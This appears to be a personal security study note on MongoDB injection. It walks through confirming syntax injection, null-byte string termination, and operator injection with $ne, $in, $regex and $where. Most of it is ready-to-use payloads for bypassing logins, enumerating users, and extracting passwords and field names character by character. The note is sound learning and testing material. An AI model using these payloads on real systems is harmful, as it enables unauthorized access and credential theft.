---
tags:
  - web
  - security
---
# Syntax Injection
A common syntax for mongoDB query is:
```
this.category == 'user_input'
```
An example injection
```
'"`{
;$Foo}
$Foo \xYZ
```
### Confirming Syntax injection
- Test if a single `'` breaks the app (backend has `this.category == '''`)
- Then test if `\'` breaks the app (backend has `this.category == '\''`)
- Then see if you can influence boolean conditions. See if either results in different responses
	- `' && 0 && 'x` 
	- `' && 1 && 'x` 
### Null Character Termination
- MongoDB by default terminates command after null character `%00` (acts similarly like comment `--`)
### Payloads
```
fizzy'%00
```
- Terminates string early with `%00`

```
'||'1'=='1%00
```
- Adds an OR = 1 (like OR 1=1)
- Terminates string early with `%00`
# Operator Injection
Abuses operators:
- `$where` - Matches documents that satisfy a JavaScript expression.
- `$ne` - Matches all values that are not equal to a specified value.
- `$in` - Matches all of the values specified in an array.
- `$regex` - Selects documents where values match a specified regular expression.
### Checking For Operator Injection
- Test if adding `"$where":"0` or `"$where":"1"` changes things
### Payloads
```
[$ne]=invalid
```
- For URL parameter
```
{"$ne":"invalid"}
```
- Gets all that are not `"invalid"`
- Only for json input
```
{"$in":["admin","administrator","superadmin"]}
```
- Gets user that matches one of the strings
- Only for json input
```
[$regex]=admin.*
```
```
{"$regex":"admin.*"}
```
- Matches regex for any user like admin
- Only for json input
```
admin' && this.password[0] == 'a' || 'a'=='b
```
- Limited javascript capabiltiy, matches where the password is equal to 'a'
- Works with url parameters
```
admin' && this.password.length >= 8 || 'a'=='b
```
- Limited javascript capabiltiy, matches where the password is equal to 'a'
- Works with url parameters
```
admin' && this.password.match(/\d/) || 'a'=='b
```
- Match if the password contains digits `\d` (regex)
- Works with url parameters
```
admin' && this.username!='
```
- Used to see if the field name `username` exists. If it does exist then it should not error
- Works with url parameters
```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```
- If there is operator support, then you can extract name of data fields with `keys()`. Extracts the first data field and returns the first character of the field name
```
{"$regex":"^.*"}
```
- See if there is a regex match for a field
```
{"$regex":"^a.*"}
```
- See if there is a regex match for the field starts with 'a'